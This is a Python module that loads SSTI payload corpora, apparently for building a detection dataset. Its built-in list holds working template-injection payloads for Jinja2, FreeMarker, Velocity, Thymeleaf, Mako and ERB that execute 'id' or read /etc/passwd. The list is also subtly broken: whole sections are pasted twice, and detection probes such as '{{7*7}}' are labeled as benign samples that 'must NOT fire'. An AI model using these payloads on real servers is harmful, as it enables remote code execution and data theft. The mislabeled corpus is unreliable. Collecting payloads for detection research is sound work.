"""Load and normalize raw SSTI payload corpora."""
from __future__ import annotations

from pathlib import Path


def normalize_payload(line: str) -> str:
    """Strip whitespace, drop blank lines and pure comments."""
    s = line.strip()
    if not s:
        return ""
    if s.startswith("#"):
        return ""
    return s


def load_payloads_from_file(path: Path) -> list[str]:
    out: list[str] = []
    for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        p = normalize_payload(line)
        if p:
            out.append(p)
    return out


def load_payloads_from_dir(root: Path) -> list[str]:
    """Recursively load all .txt payloads under root, deduped, order preserved."""
    root = Path(root)
    seen: set[str] = set()
    out: list[str] = []
    files = sorted(root.rglob("*.txt")) if root.is_dir() else []
    for f in files:
        for p in load_payloads_from_file(f):
            if p not in seen:
                seen.add(p)
                out.append(p)
    return out


# Built-in SSTI payloads (40+), spanning multiple engines and bypass classes.
BUILTIN_PAYLOADS: list[str] = [
    # --- Detection / math probes ---
    "{{7*7}}",
    "{{7*'7'}}",
    "{{49}}",
    "{{7+7}}",
    "{{7*7*7}}",
    "${7*7}",
    "${7+7}",
    "<%= 7*7 %>",
    "<%= 7+7 %>",
    "#{7*7}",
    "#{7+7}",
    "*{7*7}",
    # --- Jinja2 / Twig config & object leakage ---
    "{{config}}",
    "{{config.items()}}",
    "{{self}}",
    "{{request}}",
    "{{request.application}}",
    # --- Jinja2 Python object introspection chains ---
    "{{''.__class__}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{ ''.__class__.__bases__[0].__subclasses__() }}",
    "{{ ().__class__.__bases__[0].__subclasses__() }}",
    "{{ [].__class__.__mro__[1].__subclasses__() }}",
    "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
    "{{ dict.__init__.__globals__ }}",
    "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
    "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}",
    "{{ request.application.__globals__ }}",
    # --- Jinja2 RCE via global gadgets (no config/self/request keywords) ---
    "{%import os%}{{os.popen(\"id\").read()}}",
    "{{__import__('os').popen('id').read()}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
    "{{namespace.__init__.__globals__.os.popen('id').read()}}",
    "{% set x = ''.__class__.__mro__[1].__subclasses__() %}{{x}}",
    # --- Java FreeMarker RCE ---
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",[\"id\"]).start()}",
    "${.vars}",
    "${.globals}",
    "${product.color}",
    # --- Java Velocity RCE ---
    "#set($str=$class.inspect(\"java.lang.String\").type)",
    "#set($chr=$class.inspect(\"java.lang.Character\").type)",
    "#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec('id'))",
    "$ex.waitFor()",
    "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec('id')",
    "#set($cmd='id')",
    # --- Spring / Thymeleaf-style ---
    "#{T(org.apache.commons.io.IOUtils).toString(Runtime.getRuntime().exec('id').getInputStream())}",
    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
    # --- Mako / generic Python-side ---
    "${__import__('os').popen('id').read()}",
    "${self.module.cache.util.os.system('id')}",
    # --- ERB / EJS (Ruby / JS) ---
    "<%= `id` %>",
    "<%= Kernel.exec('id') %>",
    "<%= 7*7 %>",
    # --- Benign / negative samples (must NOT fire) ---
    "${7*7}",
    "{{7*7}}",
    "hello world",
    "test_input",
    # --- Spring / Thymeleaf-style ---
    "#{T(org.apache.commons.io.IOUtils).toString(Runtime.getRuntime().exec('id').getInputStream())}",
    # --- Mako / generic Python-side ---
    "${__import__('os').popen('id').read()}",
    # --- ERB / EJS (Ruby / JS) ---
    "<%= `id` %>",
    "<%= Kernel.exec('id') %>",
    # --- Benign / negative samples (must NOT fire) ---
    "${7*7}",
    "{{7*7}}",
    "hello world",
    "test_input",
]


def load_all_corpora(raw_dir: Path) -> list[str]:
    """Load external corpora if available, plus built-in payloads, deduped."""
    raw_dir = Path(raw_dir)
    seen: set[str] = set()
    out: list[str] = []

    for subdir in ("PayloadsAllTheThings", "SecLists"):
        d = raw_dir / subdir
        if d.is_dir():
            for payload in load_payloads_from_dir(d):
                if payload not in seen:
                    seen.add(payload)
                    out.append(payload)

    for payload in BUILTIN_PAYLOADS:
        if payload not in seen:
            seen.add(payload)
            out.append(payload)

    return out
